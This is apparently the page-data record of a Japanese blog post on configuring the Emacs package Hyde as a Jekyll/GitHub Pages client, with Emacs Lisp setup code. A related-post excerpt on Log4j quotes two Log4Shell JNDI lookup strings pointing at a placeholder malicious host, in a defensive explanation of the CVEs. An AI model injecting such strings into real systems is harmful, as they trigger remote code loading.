{"componentChunkName":"component---src-templates-post-tsx","path":"/posts/49","result":{"data":{"esaPost":{"number":49,"relative_category":"blog/backend","fields":{"title":"HydeをつかってEmacsをJekyllクライアントにする","excerpt":"Emacianとしてその殻の中に閉じこもっていたいです。だけど、世間がそれを許さず次々と無理難題を押しつけてくるのです。今回はタスク等から出てきた備忘禄をGitHub Pages（Jekyll）で管理しようと重い腰を上げました。   > PROBLEMPROBLEM \n\n- タスクメモがAsanaなどのタスク管理ツールに散在している\n- ブラウザをつかって文章を書くのがつらい\n- Gist/Yagist等でもいいのだけど編集がめんどうとか個人だとオーバースペックとか   > SOLUTIONSOLUTION \n\nというわけで、GitHub Pages（Jekyll）をEmacsで楽に管理できないかと以前から考えていたのですが、いい塩梅のライブラリを発見しました。JekyllだからHydeと言います。名前が jekyll doctor (hyde)とかぶっていますがここでは気にしません。 \n\nHydeのPros/Consは以下の通りです。 \n\nPros \n\n- gitの自動コメント\n- jekyll build、jekyll serveのショートカット \n\nCons \n\n- キーバインドが既存のものとかぶる\n- hyde-homeがカスタム変数ではない\n- add-hookが効かない   > Hydeの設定Hydeの設定 \n\nHydeの設定は基本いじることもなくJekyllを使うことが出来ます。下記記載するのはConsつぶしですが、ここはお好みです。 \n\nまず、キーバインド操作。Hyde本体がキーバインドをdefvarで割り当てているので、init.elの設定でrequire前に割り込みevalして、hyde関数にhyde-home引数をわたすことで解決します。あと、折り返し回りは別設定になっているのでadaptive-wrapやtruncate-linesを設定しています。   emacs-lisp \n\n;;; Hyde (Jekyll client) (require-package 'adaptive-wrap) (defun hyde/open-post-maybe-into-other-window (pos) \"Opens the post under cursor in the editor (POS).\" (interactive \"d\") (let ((post-file-name (nth 1 (split-string (strip-string (thing-at-point 'line)) \" : \"))) (dir (get-text-property pos 'dir))) (let ((hyde-buffer (current-buffer))) (find-file-other-window (strip-string (concat hyde-home \"/\" dir \"/\" post-file-name))) (hyde-markdown-activate-mode hyde-buffer) (adaptive-wrap-prefix-mode t) (set-default 'truncate-lines nil)))) (defun hyde/quit-wrap () \"Quits hyde.\" (interactive) (progn (delete-other-windows) (kill-buffer (current-buffer)))) (defun create-markdown-scratch () \"Create a markdown scratch buffer.\" (interactive) (switch-to-buffer (get-buffer-create \"*markdown*\")) (markdown-mode)) (defun hyde/nabinno () \"Run hyde-wrap with home parameter.\" (interactive) (progn (delete-other-windows) (create-markdown-scratch) (split-window-horizontally) (other-window 1) (hyde \"~/nabinno.github.io/\"))) (defvar hyde-mode-map (let ((hyde-mode-map (make-sparse-keymap))) (define-key hyde-mode-map (kbd \"N\") 'hyde/new-post) (define-key hyde-mode-map (kbd \"G\") 'hyde/load-posts) (define-key hyde-mode-map (kbd \"C\") 'hyde/hyde-commit-post) (define-key hyde-mode-map (kbd \"P\") 'hyde/hyde-push) (define-key hyde-mode-map (kbd \"J\") 'hyde/run-jekyll) (define-key hyde-mode-map (kbd \"S\") 'hyde/serve) (define-key hyde-mode-map (kbd \"K\") 'hyde/stop-serve) (define-key hyde-mode-map (kbd \"d\") 'hyde/deploy) (define-key hyde-mode-map (kbd \"D\") 'hyde/delete-post) (define-key hyde-mode-map (kbd \"U\") 'hyde/promote-to-post) (define-key hyde-mode-map (kbd \"X\") 'hyde/quit-wrap) (define-key hyde-mode-map (kbd \"O\") 'hyde/open-post-maybe-into-other-window) hyde-mode-map) \"Keymap for Hyde\") (global-set-key (kbd \"C-c ; j\") 'hyde/nabinno) (require-package 'hyde) (require 'hyde)   \n\n次に、ホストIPの操作。Jekyllのルートにおく.hyde.elの中身です。JekyllはWebrickを使っているので、VMなどでホストをいじっている場合はhyde/serve-commandにホストIPを0.0.0.0（jekyll s -H 0.0.0.0）に変更する必要があります。   emacs-lisp \n\n(setq hyde-deploy-dir \"_site\" hyde-posts-dir \"_posts\" hyde-drafts-dir \"_drafts\" hyde-images-dir \"images\" hyde/git/remote \"upstream\" ; The name of the remote to which we should push hyde/git/branch \"master\" ; The name of the branch on which your blog resides hyde/jekyll-command \"jekyll b\" ; Command to build hyde/serve-command \"jekyll s -H 0.0.0.0 --force_polling\" ; Command to serve hyde-custom-params '((\"category\" \"personal\") (\"tags\" \"\") (\"cover\" \"false\") (\"cover-image\" \"\")))     > WRAPUPWRAPUP \n\nHydeを介してEmacsでJekyllを操作できるのは、やはり快適です。特にorg-modeとMarkdownの相性が良く。org-modeで管理していた備忘をMarkdownに変換し、Jekyll（GitHub Pages）にパブリッシュというワークフローが引けたのが良かったです。数年間はお世話になると思います。","thumbnail":"https://img.esa.io/uploads/production/attachments/16651/2021/01/11/97367/7fa6aa49-7f81-4563-b21a-03ceef6601f9.png"},"wip":false,"body_md":"<img width=\"824\" alt=\"thumbnail\" src=\"https://img.esa.io/uploads/production/attachments/16651/2021/01/11/97367/7fa6aa49-7f81-4563-b21a-03ceef6601f9.png\">\r\n\r\nEmacianとしてその殻の中に閉じこもっていたいです。だけど、世間がそれを許さず次々と無理難題を押しつけてくるのです。今回はタスク等から出てきた備忘禄をGitHub Pages（Jekyll）で管理しようと重い腰を上げました。\r\n\r\n# PROBLEM\r\n- タスクメモがAsanaなどのタスク管理ツールに散在している\r\n- ブラウザをつかって文章を書くのがつらい\r\n- Gist/Yagist等でもいいのだけど編集がめんどうとか個人だとオーバースペックとか\r\n\r\n# SOLUTION\r\nというわけで、[GitHub Pages](https://pages.github.com/)（[Jekyll](https://jekyllrb.com/)）をEmacsで楽に管理できないかと以前から考えていたのですが、いい塩梅のライブラリを発見しました。Jekyllだから[Hyde](https://github.com/nibrahim/Hyde)と言います。名前が `jekyll doctor (hyde)`とかぶっていますがここでは気にしません。\r\n\r\nHydeのPros/Consは以下の通りです。\r\n\r\n**Pros**\r\n\r\n- `git`の自動コメント\r\n- `jekyll build`、`jekyll serve`のショートカット\r\n\r\n**Cons**\r\n\r\n- キーバインドが既存のものとかぶる\r\n- `hyde-home`がカスタム変数ではない\r\n- `add-hook`が効かない\r\n\r\n## Hydeの設定\r\nHydeの設定は基本いじることもなくJekyllを使うことが出来ます。下記記載するのはConsつぶしですが、ここはお好みです。\r\n\r\nまず、キーバインド操作。Hyde本体がキーバインドを`defvar`で割り当てているので、`init.el`の設定で`require`前に割り込みevalして、`hyde`関数に`hyde-home`引数をわたすことで解決します。あと、折り返し回りは別設定になっているので`adaptive-wrap`や`truncate-lines`を設定しています。\r\n\r\n```emacs-lisp\r\n;;; Hyde (Jekyll client)\r\n(require-package 'adaptive-wrap)\r\n(defun hyde/open-post-maybe-into-other-window (pos)\r\n  \"Opens the post under cursor in the editor (POS).\"\r\n  (interactive \"d\")\r\n  (let ((post-file-name (nth\r\n                         1\r\n                         (split-string (strip-string (thing-at-point 'line)) \" : \")))\r\n        (dir (get-text-property pos 'dir)))\r\n    (let ((hyde-buffer (current-buffer)))\r\n      (find-file-other-window\r\n       (strip-string (concat hyde-home \"/\" dir \"/\" post-file-name)))\r\n      (hyde-markdown-activate-mode hyde-buffer)\r\n      (adaptive-wrap-prefix-mode t)\r\n      (set-default 'truncate-lines nil))))\r\n(defun hyde/quit-wrap ()\r\n  \"Quits hyde.\"\r\n  (interactive)\r\n  (progn\r\n    (delete-other-windows)\r\n    (kill-buffer (current-buffer))))\r\n(defun create-markdown-scratch ()\r\n  \"Create a markdown scratch buffer.\"\r\n  (interactive)\r\n  (switch-to-buffer (get-buffer-create \"*markdown*\"))\r\n  (markdown-mode))\r\n(defun hyde/nabinno ()\r\n  \"Run hyde-wrap with home parameter.\"\r\n  (interactive)\r\n  (progn\r\n    (delete-other-windows)\r\n    (create-markdown-scratch)\r\n    (split-window-horizontally)\r\n    (other-window 1)\r\n    (hyde \"~/nabinno.github.io/\")))\r\n(defvar hyde-mode-map\r\n  (let\r\n      ((hyde-mode-map (make-sparse-keymap)))\r\n    (define-key hyde-mode-map (kbd \"N\") 'hyde/new-post)\r\n    (define-key hyde-mode-map (kbd \"G\") 'hyde/load-posts)\r\n    (define-key hyde-mode-map (kbd \"C\") 'hyde/hyde-commit-post)\r\n    (define-key hyde-mode-map (kbd \"P\") 'hyde/hyde-push)\r\n    (define-key hyde-mode-map (kbd \"J\") 'hyde/run-jekyll)\r\n    (define-key hyde-mode-map (kbd \"S\") 'hyde/serve)\r\n    (define-key hyde-mode-map (kbd \"K\") 'hyde/stop-serve)\r\n    (define-key hyde-mode-map (kbd \"d\") 'hyde/deploy)\r\n    (define-key hyde-mode-map (kbd \"D\") 'hyde/delete-post)\r\n    (define-key hyde-mode-map (kbd \"U\") 'hyde/promote-to-post)\r\n    (define-key hyde-mode-map (kbd \"X\") 'hyde/quit-wrap)\r\n    (define-key hyde-mode-map (kbd \"O\") 'hyde/open-post-maybe-into-other-window)\r\n    hyde-mode-map)\r\n  \"Keymap for Hyde\")\r\n(global-set-key (kbd \"C-c ; j\") 'hyde/nabinno)\r\n(require-package 'hyde)\r\n(require 'hyde)\r\n```\r\n\r\n次に、ホストIPの操作。Jekyllのルートにおく`.hyde.el`の中身です。JekyllはWebrickを使っているので、VMなどでホストをいじっている場合は`hyde/serve-command`にホストIPを0.0.0.0（`jekyll s -H 0.0.0.0`）に変更する必要があります。\r\n\r\n```emacs-lisp\r\n(setq hyde-deploy-dir \"_site\"\r\n      hyde-posts-dir  \"_posts\"\r\n      hyde-drafts-dir \"_drafts\"\r\n      hyde-images-dir \"images\"\r\n      hyde/git/remote \"upstream\" ; The name of the remote to which we should push\r\n      hyde/git/branch \"master\"   ; The name of the branch on which your blog resides\r\n      hyde/jekyll-command \"jekyll b\"    ; Command to build\r\n      hyde/serve-command  \"jekyll s -H 0.0.0.0 --force_polling\"    ; Command to serve\r\n      hyde-custom-params '((\"category\" \"personal\")\r\n                           (\"tags\" \"\")\r\n                           (\"cover\" \"false\")\r\n                           (\"cover-image\" \"\")))\r\n```\r\n\r\n# WRAPUP\r\nHydeを介してEmacsでJekyllを操作できるのは、やはり快適です。特にorg-modeとMarkdownの相性が良く。org-modeで管理していた備忘をMarkdownに変換し、Jekyll（GitHub Pages）にパブリッシュというワークフローが引けたのが良かったです。数年間はお世話になると思います。","body_html":"<a href=\"https://img.esa.io/uploads/production/attachments/16651/2021/01/11/97367/7fa6aa49-7f81-4563-b21a-03ceef6601f9.png\" target=\"_blank\" rel=\"noopener noreferrer\"><img width=\"824\" alt=\"thumbnail\" src=\"https://img.esa.io/uploads/production/attachments/16651/2021/01/11/97367/7fa6aa49-7f81-4563-b21a-03ceef6601f9.png\"></a>\n<p data-sourcepos=\"3:1-3:292\">Emacianとしてその殻の中に閉じこもっていたいです。だけど、世間がそれを許さず次々と無理難題を押しつけてくるのです。今回はタスク等から出てきた備忘禄をGitHub Pages（Jekyll）で管理しようと重い腰を上げました。</p>\n<h1 data-sourcepos=\"5:1-5:9\" id=\"1-0-0\" name=\"1-0-0\">\n<a class=\"anchor\" id=\"PROBLEM\" name=\"PROBLEM\" href=\"#PROBLEM\" data-position=\"1-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"PROBLEM\"> &gt; PROBLEM</span></a>PROBLEM</h1>\n<ul data-sourcepos=\"6:1-9:0\">\n<li data-sourcepos=\"6:1-6:79\">タスクメモがAsanaなどのタスク管理ツールに散在している</li>\n<li data-sourcepos=\"7:1-7:59\">ブラウザをつかって文章を書くのがつらい</li>\n<li data-sourcepos=\"8:1-9:0\">Gist/Yagist等でもいいのだけど編集がめんどうとか個人だとオーバースペックとか</li>\n</ul>\n<h1 data-sourcepos=\"10:1-10:10\" id=\"2-0-0\" name=\"2-0-0\">\n<a class=\"anchor\" id=\"SOLUTION\" name=\"SOLUTION\" href=\"#SOLUTION\" data-position=\"2-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"SOLUTION\"> &gt; SOLUTION</span></a>SOLUTION</h1>\n<p data-sourcepos=\"11:1-11:401\">というわけで、<a href=\"https://pages.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">GitHub Pages</a>（<a href=\"https://jekyllrb.com/\" target=\"_blank\" rel=\"noopener noreferrer\">Jekyll</a>）をEmacsで楽に管理できないかと以前から考えていたのですが、いい塩梅のライブラリを発見しました。Jekyllだから<a href=\"https://github.com/nibrahim/Hyde\" target=\"_blank\" rel=\"noopener noreferrer\">Hyde</a>と言います。名前が <code>jekyll doctor (hyde)</code>とかぶっていますがここでは気にしません。</p>\n<p data-sourcepos=\"13:1-13:43\">HydeのPros/Consは以下の通りです。</p>\n<p data-sourcepos=\"15:1-15:8\"><strong>Pros</strong></p>\n<ul data-sourcepos=\"17:1-19:0\">\n<li data-sourcepos=\"17:1-17:28\">\n<code>git</code>の自動コメント</li>\n<li data-sourcepos=\"18:1-19:0\">\n<code>jekyll build</code>、<code>jekyll serve</code>のショートカット</li>\n</ul>\n<p data-sourcepos=\"20:1-20:8\"><strong>Cons</strong></p>\n<ul data-sourcepos=\"22:1-25:0\">\n<li data-sourcepos=\"22:1-22:50\">キーバインドが既存のものとかぶる</li>\n<li data-sourcepos=\"23:1-23:46\">\n<code>hyde-home</code>がカスタム変数ではない</li>\n<li data-sourcepos=\"24:1-25:0\">\n<code>add-hook</code>が効かない</li>\n</ul>\n<h2 data-sourcepos=\"26:1-26:16\" id=\"2-1-0\" name=\"2-1-0\">\n<a class=\"anchor\" id=\"Hydeの設定\" name=\"Hyde%E3%81%AE%E8%A8%AD%E5%AE%9A\" href=\"#Hyde%E3%81%AE%E8%A8%AD%E5%AE%9A\" data-position=\"2-1-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"Hydeの設定\"> &gt; Hydeの設定</span></a>Hydeの設定</h2>\n<p data-sourcepos=\"27:1-27:161\">Hydeの設定は基本いじることもなくJekyllを使うことが出来ます。下記記載するのはConsつぶしですが、ここはお好みです。</p>\n<p data-sourcepos=\"29:1-29:367\">まず、キーバインド操作。Hyde本体がキーバインドを<code>defvar</code>で割り当てているので、<code>init.el</code>の設定で<code>require</code>前に割り込みevalして、<code>hyde</code>関数に<code>hyde-home</code>引数をわたすことで解決します。あと、折り返し回りは別設定になっているので<code>adaptive-wrap</code>や<code>truncate-lines</code>を設定しています。</p>\n<div class=\"code-block\" data-sourcepos=\"31:1-87:3\">\n<div class=\"code-filename\">\n<i class=\"fa fa-file-code-o\"></i>emacs-lisp</div>\n<div class=\"highlight\"><pre class=\"highlight emacs-lisp\"><code><span class=\"c1\">;;; Hyde (Jekyll client)</span>\n<span class=\"p\">(</span><span class=\"nv\">require-package</span> <span class=\"ss\">'adaptive-wrap</span><span class=\"p\">)</span>\n<span class=\"p\">(</span><span class=\"nb\">defun</span> <span class=\"nv\">hyde/open-post-maybe-into-other-window</span> <span class=\"p\">(</span><span class=\"nv\">pos</span><span class=\"p\">)</span>\n  <span class=\"s\">\"Opens the post under cursor in the editor (POS).\"</span>\n  <span class=\"p\">(</span><span class=\"nv\">interactive</span> <span class=\"s\">\"d\"</span><span class=\"p\">)</span>\n  <span class=\"p\">(</span><span class=\"k\">let</span> <span class=\"p\">((</span><span class=\"nv\">post-file-name</span> <span class=\"p\">(</span><span class=\"nb\">nth</span>\n                         <span class=\"mi\">1</span>\n                         <span class=\"p\">(</span><span class=\"nv\">split-string</span> <span class=\"p\">(</span><span class=\"nv\">strip-string</span> <span class=\"p\">(</span><span class=\"nv\">thing-at-point</span> <span class=\"ss\">'line</span><span class=\"p\">))</span> <span class=\"s\">\" : \"</span><span class=\"p\">)))</span>\n        <span class=\"p\">(</span><span class=\"nv\">dir</span> <span class=\"p\">(</span><span class=\"nv\">get-text-property</span> <span class=\"nv\">pos</span> <span class=\"ss\">'dir</span><span class=\"p\">)))</span>\n    <span class=\"p\">(</span><span class=\"k\">let</span> <span class=\"p\">((</span><span class=\"nv\">hyde-buffer</span> <span class=\"p\">(</span><span class=\"nv\">current-buffer</span><span class=\"p\">)))</span>\n      <span class=\"p\">(</span><span class=\"nv\">find-file-other-window</span>\n       <span class=\"p\">(</span><span class=\"nv\">strip-string</span> <span class=\"p\">(</span><span class=\"nv\">concat</span> <span class=\"nv\">hyde-home</span> <span class=\"s\">\"/\"</span> <span class=\"nv\">dir</span> <span class=\"s\">\"/\"</span> <span class=\"nv\">post-file-name</span><span class=\"p\">)))</span>\n      <span class=\"p\">(</span><span class=\"nv\">hyde-markdown-activate-mode</span> <span class=\"nv\">hyde-buffer</span><span class=\"p\">)</span>\n      <span class=\"p\">(</span><span class=\"nv\">adaptive-wrap-prefix-mode</span> <span class=\"no\">t</span><span class=\"p\">)</span>\n      <span class=\"p\">(</span><span class=\"nv\">set-default</span> <span class=\"ss\">'truncate-lines</span> <span class=\"no\">nil</span><span class=\"p\">))))</span>\n<span class=\"p\">(</span><span class=\"nb\">defun</span> <span class=\"nv\">hyde/quit-wrap</span> <span class=\"p\">()</span>\n  <span class=\"s\">\"Quits hyde.\"</span>\n  <span class=\"p\">(</span><span class=\"nv\">interactive</span><span class=\"p\">)</span>\n  <span class=\"p\">(</span><span class=\"k\">progn</span>\n    <span class=\"p\">(</span><span class=\"nv\">delete-other-windows</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">kill-buffer</span> <span class=\"p\">(</span><span class=\"nv\">current-buffer</span><span class=\"p\">))))</span>\n<span class=\"p\">(</span><span class=\"nb\">defun</span> <span class=\"nv\">create-markdown-scratch</span> <span class=\"p\">()</span>\n  <span class=\"s\">\"Create a markdown scratch buffer.\"</span>\n  <span class=\"p\">(</span><span class=\"nv\">interactive</span><span class=\"p\">)</span>\n  <span class=\"p\">(</span><span class=\"nv\">switch-to-buffer</span> <span class=\"p\">(</span><span class=\"nv\">get-buffer-create</span> <span class=\"s\">\"*markdown*\"</span><span class=\"p\">))</span>\n  <span class=\"p\">(</span><span class=\"nv\">markdown-mode</span><span class=\"p\">))</span>\n<span class=\"p\">(</span><span class=\"nb\">defun</span> <span class=\"nv\">hyde/nabinno</span> <span class=\"p\">()</span>\n  <span class=\"s\">\"Run hyde-wrap with home parameter.\"</span>\n  <span class=\"p\">(</span><span class=\"nv\">interactive</span><span class=\"p\">)</span>\n  <span class=\"p\">(</span><span class=\"k\">progn</span>\n    <span class=\"p\">(</span><span class=\"nv\">delete-other-windows</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">create-markdown-scratch</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">split-window-horizontally</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">other-window</span> <span class=\"mi\">1</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">hyde</span> <span class=\"s\">\"~/nabinno.github.io/\"</span><span class=\"p\">)))</span>\n<span class=\"p\">(</span><span class=\"nb\">defvar</span> <span class=\"nv\">hyde-mode-map</span>\n  <span class=\"p\">(</span><span class=\"k\">let</span>\n      <span class=\"p\">((</span><span class=\"nv\">hyde-mode-map</span> <span class=\"p\">(</span><span class=\"nv\">make-sparse-keymap</span><span class=\"p\">)))</span>\n    <span class=\"p\">(</span><span class=\"nv\">define-key</span> <span class=\"nv\">hyde-mode-map</span> <span class=\"p\">(</span><span class=\"nv\">kbd</span> <span class=\"s\">\"N\"</span><span class=\"p\">)</span> <span class=\"ss\">'hyde/new-post</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">define-key</span> <span class=\"nv\">hyde-mode-map</span> <span class=\"p\">(</span><span class=\"nv\">kbd</span> <span class=\"s\">\"G\"</span><span class=\"p\">)</span> <span class=\"ss\">'hyde/load-posts</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">define-key</span> <span class=\"nv\">hyde-mode-map</span> <span class=\"p\">(</span><span class=\"nv\">kbd</span> <span class=\"s\">\"C\"</span><span class=\"p\">)</span> <span class=\"ss\">'hyde/hyde-commit-post</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">define-key</span> <span class=\"nv\">hyde-mode-map</span> <span class=\"p\">(</span><span class=\"nv\">kbd</span> <span class=\"s\">\"P\"</span><span class=\"p\">)</span> <span class=\"ss\">'hyde/hyde-push</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">define-key</span> <span class=\"nv\">hyde-mode-map</span> <span class=\"p\">(</span><span class=\"nv\">kbd</span> <span class=\"s\">\"J\"</span><span class=\"p\">)</span> <span class=\"ss\">'hyde/run-jekyll</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">define-key</span> <span class=\"nv\">hyde-mode-map</span> <span class=\"p\">(</span><span class=\"nv\">kbd</span> <span class=\"s\">\"S\"</span><span class=\"p\">)</span> <span class=\"ss\">'hyde/serve</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">define-key</span> <span class=\"nv\">hyde-mode-map</span> <span class=\"p\">(</span><span class=\"nv\">kbd</span> <span class=\"s\">\"K\"</span><span class=\"p\">)</span> <span class=\"ss\">'hyde/stop-serve</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">define-key</span> <span class=\"nv\">hyde-mode-map</span> <span class=\"p\">(</span><span class=\"nv\">kbd</span> <span class=\"s\">\"d\"</span><span class=\"p\">)</span> <span class=\"ss\">'hyde/deploy</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">define-key</span> <span class=\"nv\">hyde-mode-map</span> <span class=\"p\">(</span><span class=\"nv\">kbd</span> <span class=\"s\">\"D\"</span><span class=\"p\">)</span> <span class=\"ss\">'hyde/delete-post</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">define-key</span> <span class=\"nv\">hyde-mode-map</span> <span class=\"p\">(</span><span class=\"nv\">kbd</span> <span class=\"s\">\"U\"</span><span class=\"p\">)</span> <span class=\"ss\">'hyde/promote-to-post</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">define-key</span> <span class=\"nv\">hyde-mode-map</span> <span class=\"p\">(</span><span class=\"nv\">kbd</span> <span class=\"s\">\"X\"</span><span class=\"p\">)</span> <span class=\"ss\">'hyde/quit-wrap</span><span class=\"p\">)</span>\n    <span class=\"p\">(</span><span class=\"nv\">define-key</span> <span class=\"nv\">hyde-mode-map</span> <span class=\"p\">(</span><span class=\"nv\">kbd</span> <span class=\"s\">\"O\"</span><span class=\"p\">)</span> <span class=\"ss\">'hyde/open-post-maybe-into-other-window</span><span class=\"p\">)</span>\n    <span class=\"nv\">hyde-mode-map</span><span class=\"p\">)</span>\n  <span class=\"s\">\"Keymap for Hyde\"</span><span class=\"p\">)</span>\n<span class=\"p\">(</span><span class=\"nv\">global-set-key</span> <span class=\"p\">(</span><span class=\"nv\">kbd</span> <span class=\"s\">\"C-c ; j\"</span><span class=\"p\">)</span> <span class=\"ss\">'hyde/nabinno</span><span class=\"p\">)</span>\n<span class=\"p\">(</span><span class=\"nv\">require-package</span> <span class=\"ss\">'hyde</span><span class=\"p\">)</span>\n<span class=\"p\">(</span><span class=\"nb\">require</span> <span class=\"ss\">'hyde</span><span class=\"p\">)</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"89:1-89:290\">次に、ホストIPの操作。Jekyllのルートにおく<code>.hyde.el</code>の中身です。JekyllはWebrickを使っているので、VMなどでホストをいじっている場合は<code>hyde/serve-command</code>にホストIPを0.0.0.0（<code>jekyll s -H 0.0.0.0</code>）に変更する必要があります。</p>\n<div class=\"code-block\" data-sourcepos=\"91:1-104:3\">\n<div class=\"code-filename\">\n<i class=\"fa fa-file-code-o\"></i>emacs-lisp</div>\n<div class=\"highlight\"><pre class=\"highlight emacs-lisp\"><code><span class=\"p\">(</span><span class=\"k\">setq</span> <span class=\"nv\">hyde-deploy-dir</span> <span class=\"s\">\"_site\"</span>\n      <span class=\"nv\">hyde-posts-dir</span>  <span class=\"s\">\"_posts\"</span>\n      <span class=\"nv\">hyde-drafts-dir</span> <span class=\"s\">\"_drafts\"</span>\n      <span class=\"nv\">hyde-images-dir</span> <span class=\"s\">\"images\"</span>\n      <span class=\"nv\">hyde/git/remote</span> <span class=\"s\">\"upstream\"</span> <span class=\"c1\">; The name of the remote to which we should push</span>\n      <span class=\"nv\">hyde/git/branch</span> <span class=\"s\">\"master\"</span>   <span class=\"c1\">; The name of the branch on which your blog resides</span>\n      <span class=\"nv\">hyde/jekyll-command</span> <span class=\"s\">\"jekyll b\"</span>    <span class=\"c1\">; Command to build</span>\n      <span class=\"nv\">hyde/serve-command</span>  <span class=\"s\">\"jekyll s -H 0.0.0.0 --force_polling\"</span>    <span class=\"c1\">; Command to serve</span>\n      <span class=\"nv\">hyde-custom-params</span> <span class=\"o\">'</span><span class=\"p\">((</span><span class=\"s\">\"category\"</span> <span class=\"s\">\"personal\"</span><span class=\"p\">)</span>\n                           <span class=\"p\">(</span><span class=\"s\">\"tags\"</span> <span class=\"s\">\"\"</span><span class=\"p\">)</span>\n                           <span class=\"p\">(</span><span class=\"s\">\"cover\"</span> <span class=\"s\">\"false\"</span><span class=\"p\">)</span>\n                           <span class=\"p\">(</span><span class=\"s\">\"cover-image\"</span> <span class=\"s\">\"\"</span><span class=\"p\">)))</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"106:1-106:8\" id=\"3-0-0\" name=\"3-0-0\">\n<a class=\"anchor\" id=\"WRAPUP\" name=\"WRAPUP\" href=\"#WRAPUP\" data-position=\"3-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"WRAPUP\"> &gt; WRAPUP</span></a>WRAPUP</h1>\n<p data-sourcepos=\"107:1-107:347\">Hydeを介してEmacsでJekyllを操作できるのは、やはり快適です。特にorg-modeとMarkdownの相性が良く。org-modeで管理していた備忘をMarkdownに変換し、Jekyll（GitHub Pages）にパブリッシュというワークフローが引けたのが良かったです。数年間はお世話になると思います。</p>\n","tags":["emacs","jekyll","hyde","github-pages"],"updated_at":"2021-01-16T12:15:18+09:00","childPublishedDate":{"published_on":"2017-02-01T00:00:00.000Z"},"updated_by":{"name":"なびの👷","screen_name":"nabinno","icon":"https://img.esa.io/uploads/production/members/94286/icon/thumb_m_ef5f024307008aa399b91f87fa5f64e8.jpg"}},"relatedPosts":{"edges":[{"node":{"number":127,"relative_category":"blog/soc","fields":{"title":"Trend Micro Vision Oneを試してみる","excerpt":"11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されており、これを気にZTAの文脈でセキュリティ製品を見ていこうと思います。今回はちょうど無償提供されているTrend Micro Vision Oneを軽く触ってみようと思います。   > PROBLEMPROBLEM \n\n- 11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されている JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228） JNDIクエリ「${jndi:ldap://127.0.0.1#malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-45046） \n- JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228）\n- JNDIクエリ「${jndi:ldap://127.0.0.1#malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-45046）  > SOLUTIONSOLUTION  \n\nFrom: Trend Micro\n Subject: Log4Shell診断ツール ご提供開始 \n\nApache Log4j2ログ出力ライブラリの複数のバージョンに影響を与える深刻な脆弱性情報が公開されています。当診断ツールは、Log4Shellの影響を受ける可能性のあるエンドポイントとWebアプリケーションを特定することができます。また、攻撃対象領域の詳細を即座に可視化し、リスクを軽減するための措置をご案内いたします。  \n\nと言うわけで、Trend Micro Vision Oneの一部機能が無償で提供されていたので確認します。Vision OneはSIEM、SOAR、EDR関連のツール。エンドポイント、サーバ、クラウド、メールおよびネットワーク全体を保護する各セキュリティ製品がセンサーとなり、各々のレイヤ―で検知した脅威や侵入の痕跡を、Threat Intelligenceを活用してサイバー攻撃の全体像を可視化します。  > Log4jShell診断ツールを試してみるLog4jShell診断ツールを試してみる \n\n1. Trend Micro Vision Oneにログイン\n2. [Log4Shell診断ツール]画面にてWindows/Mac/Linuxいずれかの診断ツールをダウンロード\n3. 1分ほどで端末にインストールされ、詳細が確認できる\n4. 自宅の端末で確認した結果はこちら \n5.  \n\nざっと試したところ数分程度でLog4Shellの診断を行う事ができました。Intune等EMMでの展開もそれほど難しくないように思います。  > 他の機能を確認他の機能を確認 \n\n先ほど試したLog4Shell診断ツールはTrend Micro Vision OneのAssessmentカテゴリのいち機能になります。Vision OneはSecurity Postureによる方針策定、Assessment・Thread Intelligenceによる脅威検出、XDR（EDR）による脅威応答、Zero Trust Secure Access・Mobile Securityによる脅威防御、Inventory Managementによる脅威特定から構成されています。  > Security PostureSecurity Posture \n\n各種リスク、脅威を表示することで、セキュリティに関する心構えとともに方針策定のヒントを提示します。    function description     Security Dashboard Company Risk Index、エンドポイントレポート、MITRE ATT&CK MATRIXマップ   Zero Trust Risk Insights アカウント侵害、脆弱性の検出、異常検出、クラウドアプリのアクティビティ、XDR検出、脅威検出     > AssessmentAssessment \n\n各種端末に対して脅威検出等のセキュリティ評価を行います。    function description     Targeted Attack Detection 標的型攻撃の検出   Security Assessment セキュリティ評価、Log4jの脆弱性検出     > Threat IntelligenceThreat Intelligence \n\n内部および外部ソースを元に分析を行い環境内の潜在的な脅威を特定します。    function description     Intelligence Reports 内部および外部のソースからの最新のインテリジェンスレポートを統合して、環境内の潜在的な脅威を特定   Suspicous Object Management 特定の疑わしいオブジェクトを検出した後に実行する接続製品のアクションを指定できます   Sandbox Analysis -     > XDR（EDR）XDR（EDR） \n\n検出モデルと応答サービスを管理します。    function description     Detection Model Management 検出モデルの管理   Workbench -   Observed Attack Techniques 観察された攻撃手法   Managed XDR マネージドXDRは検出および応答の代行サービス     > Zero Trust Secure 